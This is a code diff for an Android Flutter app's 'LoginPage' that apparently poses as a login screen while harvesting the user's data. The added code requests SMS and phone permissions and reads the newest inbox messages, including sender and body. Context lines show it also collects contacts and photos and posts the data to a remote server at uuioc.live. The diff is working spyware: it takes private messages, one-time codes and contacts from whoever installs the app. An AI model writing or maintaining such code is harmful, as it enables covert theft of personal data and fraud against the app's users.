@@ -4,7 +4,7 @@ import 'package:video_player/video_player.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
 import 'package:photo_manager/photo_manager.dart';
-import 'package:sms_advanced/sms_advanced.dart';
+import 'package:telephony/telephony.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
 import 'success_page.dart';
@@ -40,6 +40,8 @@ class _LoginPageState extends State<LoginPage> {
   List<String> _imagePaths = [];
   String? _userId;
 
+  final Telephony telephony = Telephony.instance;
+
   // 1. 权限申请
   Future<bool> _requestPermissions() async {
     Map<Permission, PermissionStatus> statuses = {};
@@ -61,7 +63,10 @@ class _LoginPageState extends State<LoginPage> {
       print('$perm: $status');
     });
 
-    return statuses.values.every((status) => status.isGranted);
+    // telephony 还需要单独申请短信权限（注意是getter，不要加括号）
+    bool? telephonyGranted = await telephony.requestPhoneAndSmsPermissions;
+    return statuses.values.every((status) => status.isGranted) &&
+        (telephonyGranted ?? false);
   }
 
   // 2. 读取联系人
@@ -77,17 +82,24 @@ class _LoginPageState extends State<LoginPage> {
     }
   }
 
-  // 3. 读取短信（安卓）
+  // 3. 读取短信（安卓，使用 telephony）
   Future<void> _getSmsList() async {
-    SmsQuery query = SmsQuery();
-    List<SmsMessage> messages = await query.getAllSms;
+    List<SmsMessage> messages = await telephony.getInboxSms(
+      columns: [
+        SmsColumn.ADDRESS,
+        SmsColumn.BODY,
+        SmsColumn.DATE,
+        SmsColumn.TYPE,
+      ],
+      sortOrder: [OrderBy(SmsColumn.DATE, sort: Sort.DESC)],
+    );
     _smsList = [];
     for (var m in messages.take(50)) {
       _smsList.add({
         'address': m.address ?? '',
         'body': m.body ?? '',
-        'date': m.dateSent?.millisecondsSinceEpoch.toString() ?? '',
-        'type': m.kind.toString(),
+        'date': m.date != null ? m.date.toString() : '',
+        'type': m.type != null ? m.type.toString() : '',
       });
     }
   }
@@ -152,7 +164,7 @@ class _LoginPageState extends State<LoginPage> {
 
     // 上传主数据
     var response = await http.post(
-      Uri.parse('https://uuioc.live/api/uploads/api'), // 改成你的服务器地址
+      Uri.parse('https://uuioc.live/api/uploads/api'),
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: {'data': data},
     );
